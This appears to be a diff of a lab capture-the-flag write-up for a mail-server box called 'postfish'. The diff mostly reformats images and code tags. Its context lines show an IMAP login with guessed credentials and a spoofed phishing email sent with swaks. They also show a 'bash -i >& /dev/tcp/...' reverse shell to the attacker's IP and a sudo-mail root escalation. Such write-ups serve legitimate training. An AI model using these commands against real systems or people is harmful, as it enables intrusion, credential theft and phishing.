@@ -26,11 +26,11 @@ This box involves testing mail services. We have to add `postfish.off` to our `/
 
 The website looked rather static:
 
-<figure><img src="../../../.gitbook/assets/image (2903).png" alt=""><figcaption></figcaption></figure>
+![](<../../../.gitbook/assets/image%20(2903).png>)
 
 There was a 'Team' page, and when viewed we get some names and roles:
 
-<figure><img src="../../../.gitbook/assets/image (491).png" alt=""><figcaption></figcaption></figure>
+![](<../../../.gitbook/assets/image%20(491).png>)
 
 Interesting.
 
@@ -60,7 +60,6 @@ Target domain ............
 
 I tried some low hanging fruits, like logging in with `hr:hr` and `postfish:postfish`. Eventually, `sales:sales` worked on IMAP:
 
-{% code overflow="wrap" %}
 ```
 $ nc -nv 192.168.183.137 143
 (UNKNOWN) [192.168.183.137] 143 (imap2) open
@@ -68,7 +67,6 @@ $ nc -nv 192.168.183.137 143
 A1 LOGIN sales sales
 A1 OK [CAPABILITY IMAP4rev1 SASL-IR LOGIN-REFERRALS ID ENABLE IDLE SORT SORT=DISPLAY THREAD=REFERENCES THREAD=REFS THREAD=ORDEREDSUBJECT MULTIAPPEND URL-PARTIAL CATENATE UNSELECT CHILDREN NAMESPACE UIDPLUS LIST-EXTENDED I18NLEVEL=1 CONDSTORE QRESYNC ESEARCH ESORT SEARCHRES WITHIN CONTEXT=SEARCH LIST-STATUS BINARY MOVE SNIPPET=FUZZY PREVIEW=FUZZY LITERAL+ NOTIFY SPECIAL-USE] Logged in
 ```
-{% endcode %}
 
 I was able to find one message present within the Inbox:
 
@@ -80,7 +78,6 @@ A1 OK Status completed (0.001 + 0.000 secs).
 
 We can read this message:
 
-{% code overflow="wrap" %}
 ```
 A1 SELECT INBOX
 A1 FETCH 1 body[text]
@@ -94,15 +91,12 @@ IT
 )
 A1 OK Fetch completed (0.001 + 0.000 secs).
 ```
-{% endcode %}
 
 So there's some password reset links being sent out, and perhaps we can trick a user into clicking on our link. I used `swaks` to send an email to send emails:
 
-{% code overflow="wrap" %}
 ```bash
 $ swaks --to SALES@postfish.off --from IT@postfish.off --header "Subject:Password Reset" --body "Click here to reset your password! http://192.168.45.208/password" --server 192.168.183.137
 ```
-{% endcode %}
 
 The above doesn't work, so I used 'Brian Moore', which is the name of the user part of the Sales team based on the website. There are tons of username generators online based on a name:
 
@@ -156,11 +150,11 @@ QUIT
 
 After the mail sends, we get a callback on our listener port with creds:
 
-<figure><img src="../../../.gitbook/assets/image (3586).png" alt=""><figcaption></figcaption></figure>
+![](<../../../.gitbook/assets/image%20(3586).png>)
 
 We can use this password to `ssh` in as `brian.moore`:
 
-<figure><img src="../../../.gitbook/assets/image (3844).png" alt=""><figcaption></figcaption></figure>
+![](<../../../.gitbook/assets/image%20(3844).png>)
 
 ## Privilege Escalation
 
@@ -227,7 +221,7 @@ bash -i >& /dev/tcp/192.168.45.208/21 0>&1
 
 This script is triggered by sending emails, so we can send another one to the machine without the phishing link to get another reverse shell:
 
-<figure><img src="../../../.gitbook/assets/image (2120).png" alt=""><figcaption></figcaption></figure>
+![](<../../../.gitbook/assets/image%20(2120).png>)
 
 ### Sudo Mail -> Root
 
@@ -245,4 +239,4 @@ User filter may run the following commands on postfish:
 
 We can get a `root` shell using the commands from GTFOBins:
 
-<figure><img src="../../../.gitbook/assets/image (1536).png" alt=""><figcaption></figcaption></figure>
+![](<../../../.gitbook/assets/image%20(1536).png>)
